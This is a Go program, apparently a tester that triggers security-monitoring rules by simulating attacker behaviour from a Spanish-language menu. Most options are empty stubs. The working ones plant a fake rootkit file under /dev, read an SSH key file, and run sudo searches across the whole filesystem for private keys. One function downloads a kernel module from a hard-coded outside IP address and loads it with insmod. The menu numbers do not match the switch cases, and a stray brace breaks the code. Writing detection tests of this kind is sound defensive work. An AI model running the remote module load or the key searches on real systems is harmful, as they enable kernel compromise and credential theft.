package behaviors

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func ShowMenu() {
	fmt.Println("Seleccione una opción:")
	fmt.Println("1. Create files below dev")
	fmt.Println("2. Read ssh information")
	fmt.Println("3. Launch Ingress Remote File Copy Tools in Container")
	fmt.Println("4. Outbound Connection to C2 Servers")
	fmt.Println("5. Launch Remote File Copy Tools in Container")
	fmt.Println("6. Directory Traversal monitored file read")
	fmt.Println("7. Linux Kernel Module Injection")
	fmt.Println("8. Clear Log Activities")
	fmt.Println("9. Remove Bulk Data from Disk")
	fmt.Println("10. Search Private Keys or Passwords")
	fmt.Println("11. ")
	fmt.Println("12. Detect crypto miners using the Stratum protocol")
	fmt.Println("13. XXX")
	fmt.Println("14. XXXX")
	fmt.Println("15. XXXXX")

	var choice int
	fmt.Print("Ingrese el número de la opción: ")
	fmt.Scanln(&choice)

	switch choice {
	case 1:
		CreateFilesBelowDev()
	case 2:
		ReadSSHInformation()
	case 3:
		LaunchIngressRemoteFileCopyToolsInContainer()
	case 4:
		OutboundConnectionToC2Servers()
	case 5:
		LaunchRemoteFileCopyToolsInContainer()
	case 6:
		DirectoryTraversalMonitoredFileRead()
	case 7:
		LinuxKernelModuleInjection()
	case 8:
		ClearLogActivities()
	case 9:
		RemoveBulkDatafromDisk()
	case 10:
		SearchPrivateKeysOrPasswords()
	case 11:
		DetectCryptoMinersUsingTheStratumProtocol()
	case 12:
		LaunchSuspiciousNetworkToolInContainer()
	case 13:
		NetcatRemoteCodeExecutionInContainer()
	case 14:
		NetcatRemoteCodeExecutionInContainer()
	case 15:
		NetcatRemoteCodeExecutionInContainer()
	default:
		fmt.Println("Opción no válida")
	}
}

func CreateFilesBelowDev() {
	fmt.Println("Ejecutando: Create files below dev")

	filePath := "/dev/randomrtk"

	// Crear el archivo
	file, err := os.Create(filePath)
	if err != nil {
		fmt.Println("Error al crear el archivo:", err)
		return
	}
	defer file.Close()

	// Escribir en el archivo
	content := "Este es un rootkit de ejemplo en /dev/randomrtk"
	_, err = file.WriteString(content)
	if err != nil {
		fmt.Println("Error al escribir en el archivo:", err)
		return
	}

	fmt.Println("Archivo creado y contenido escrito con éxito")

}

func ReadSSHInformation() {
	fmt.Println("Ejecutando: Read ssh information")
	// Obtener el directorio home del usuario actual
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error obteniendo el directorio home:", err)
		return
	}

	// Crear la carpeta oculta .ssh si no existe
	sshDir := homeDir + "/.ssh"
	err = os.MkdirAll(sshDir, 0700)
	if err != nil {
		fmt.Println("Error creando la carpeta .ssh:", err)
		return
	}

	// Crear el archivo de llave SSH
	archivoLlave := sshDir + "/id_rsa"
	file, err := os.Create(archivoLlave)
	if err != nil {
		fmt.Println("Error creando el archivo de llave SSH:", err)
		return
	}
	file.Close()

	// Esperar 1 segundo
	time.Sleep(1 * time.Second)

	// Leer el contenido del archivo de llave SSH
	cmd := exec.Command("cat", archivoLlave)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Error leyendo el archivo de llave SSH:", err)
		return
	}

	// Imprimir el contenido del archivo de llave SSH
	fmt.Println(string(output))
}
}

func LaunchIngressRemoteFileCopyToolsInContainer() {
	fmt.Println("Ejecutando Regla3")
	// Lógica para Regla3
}

func OutboundConnectionToC2Servers() {
	fmt.Println("Ejecutando: Outbound Connection to C2 Servers")
	// Lógica para Regla3
}

func LaunchRemoteFileCopyToolsInContainer() {
	fmt.Println("Ejecutando: Launch Remote File Copy Tools in Container")
	// Lógica para Regla3
}

func DirectoryTraversalMonitoredFileRead() {
	fmt.Println("Ejecutando: Directory Traversal monitored file read")
	// Lógica para Regla3
}

func LinuxKernelModuleInjection() error {
	fmt.Println("Ejecutando: Linux Kernel Module Injection")

	url := "http://34.27.180.215/sitio/cust0m_mod.ko"
	filePath := "/dev/ddd/cust0m.ko"
	dirPath := filepath.Dir(filePath)

	// Crear el directorio si no existe
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		if err := os.MkdirAll(dirPath, 0755); err != nil {
			return err
		}
	}

	// Descargar el archivo
	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	// Crear el archivo en el sistema de archivos
	outFile, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer outFile.Close()

	// Copiar el contenido descargado al archivo
	_, err = io.Copy(outFile, response.Body)
	if err != nil {
		return err
	}

	// Inyectar el módulo del kernel
	cmd := exec.Command("insmod", filePath)
	if err := cmd.Run(); err != nil {
		return err
	}

	return nil
}

func ClearLogActivities() {
	fmt.Println("Ejecutando: Clear Log Activities")
	// Lógica para Regla3
}

func RemoveBulkDatafromDisk() {
	fmt.Println("Ejecutando: Remove Bulk Data from Disk")
	// Lógica para Regla3
}

// func SearchPrivateKeysOrPasswords() {
// 	fmt.Println("Ejecutando: Search Private Keys or Passwords")

// 	// Primer comando
// 	cmd1 := exec.Command("find", "/", "-name", "id_rsa")
// 	var out1 bytes.Buffer
// 	cmd1.Stdout = &out1

// 	if err := cmd1.Run(); err != nil {
// 		fmt.Println("Error ejecutando el primer comando:", err)
// 		return
// 	}

// 	fmt.Println("Resultado del primer comando:")
// 	fmt.Println(out1.String())

// 	// Esperar 3 segundos
// 	time.Sleep(3 * time.Second)

// 	// Segundo comando
// 	cmd2 := exec.Command("grep", "-r", "BEGIN RSA PRIVATE", "/")
// 	var out2 bytes.Buffer
// 	cmd2.Stdout = &out2

// 	if err := cmd2.Run(); err != nil {
// 		fmt.Println("Error ejecutando el segundo comando:", err)
// 		return
// 	}

// 	fmt.Println("Resultado del segundo comando:")
// 	fmt.Println(out2.String())

// }

// func SearchPrivateKeysOrPasswords() {
// 	fmt.Println("Ejecutando: Search Private Keys or Passwords")

// 	// Primer comando
// 	cmd1 := exec.Command("sudo", "find", "/", "-name", "id_rsa")
// 	var out1 bytes.Buffer
// 	cmd1.Stdout = &out1
// 	cmd1.Stderr = &out1

// 	if err := cmd1.Run(); err != nil {
// 		fmt.Println("Error ejecutando el primer comando:", err)
// 		fmt.Println("Salida del error del primer comando:")
// 		fmt.Println(out1.String())
// 		return
// 	}

// 	fmt.Println("Resultado del primer comando:")
// 	fmt.Println(out1.String())

// 	// Esperar 3 segundos
// 	time.Sleep(3 * time.Second)

// 	// Segundo comando
// 	cmd2 := exec.Command("sudo", "grep", "-r", "BEGIN RSA PRIVATE", "/")
// 	var out2 bytes.Buffer
// 	cmd2.Stdout = &out2
// 	cmd2.Stderr = &out2

// 	if err := cmd2.Run(); err != nil {
// 		fmt.Println("Error ejecutando el segundo comando:", err)
// 		fmt.Println("Salida del error del segundo comando:")
// 		fmt.Println(out2.String())
// 		return
// 	}

// 	fmt.Println("Resultado del segundo comando:")
// 	fmt.Println(out2.String())
// }

func SearchPrivateKeysOrPasswords() {
	fmt.Println("Ejecutando: Search Private Keys or Passwords")

	// Primer comando
	cmd1 := exec.Command("sudo", "find", "/", "-name", "id_rsa")
	var out1 bytes.Buffer
	cmd1.Stdout = &out1
	cmd1.Stderr = &out1

	if err := cmd1.Run(); err != nil {
		fmt.Println("Error ejecutando el primer comando:", err)
		fmt.Println("Salida del error del primer comando:")
		fmt.Println(out1.String())
	} else {
		fmt.Println("Resultado del primer comando:")
		fmt.Println(out1.String())
	}

	// Esperar 3 segundos
	time.Sleep(3 * time.Second)

	// Segundo comando
	cmd2 := exec.Command("sudo", "grep", "-r", "BEGIN RSA PRIVATE", "/")
	var out2 bytes.Buffer
	cmd2.Stdout = &out2
	cmd2.Stderr = &out2

	if err := cmd2.Run(); err != nil {
		fmt.Println("Error ejecutando el segundo comando:", err)
		fmt.Println("Salida del error del segundo comando:")
		fmt.Println(out2.String())
		return
	}

	fmt.Println("Resultado del segundo comando:")
	fmt.Println(out2.String())
}

func DetectCryptoMinersUsingTheStratumProtocol() {
	fmt.Println("Ejecutando: Detect crypto miners using the Stratum protocol")
	// Lógica para Regla3
}

func LaunchSuspiciousNetworkToolInContainer() {
	fmt.Println("Ejecutando: LaunchSuspiciousNetworkToolInContainer")

	// Verificar si nmap está instalado
	_, err := exec.LookPath("nmap")
	if err != nil {
		fmt.Println("nmap no está instalado. Instalándolo...")

		// Actualizar el índice de paquetes
		cmdUpdate := exec.Command("sudo", "apt-get", "update")
		if err := cmdUpdate.Run(); err != nil {
			fmt.Println("Error al actualizar el índice de paquetes:", err)
			return
		}

		// Instalar nmap
		cmdInstall := exec.Command("sudo", "apt-get", "install", "-y", "nmap")
		if err := cmdInstall.Run(); err != nil {
			fmt.Println("Error al instalar nmap:", err)
			return
		}

		fmt.Println("nmap instalado correctamente.")
	} else {
		fmt.Println("nmap ya está instalado.")
	}

	// Comando para obtener la versión de nmap
	cmd := exec.Command("nmap", "--version")
	var out bytes.Buffer
	cmd.Stdout = &out

	if err := cmd.Run(); err != nil {
		fmt.Println("Error ejecutando el comando:", err)
		return
	}

	// Traducir la salida (este es un ejemplo simple)
	originalOutput := out.String()
	translations := map[string]string{
		"Starting":             "Iniciando",
		"Nmap version":         "Versión de Nmap",
		"( https://nmap.org )": "( https://nmap.org )",
		"Platform":             "Plataforma",
		"Compiled with":        "Compilado con",
		"Usage":                "Uso",
		"for more info":        "para más información",
	}

	translatedOutput := originalOutput
	for en, es := range translations {
		translatedOutput = strings.ReplaceAll(translatedOutput, en, es)
	}

	fmt.Println("Resultado del comando 'nmap --version':")
	fmt.Println(translatedOutput)
}

func NetcatRemoteCodeExecutionInContainer() {
	fmt.Println("Ejecutando: Detect crypto miners using the Stratum protocol")
	// Lógica para Regla3
}
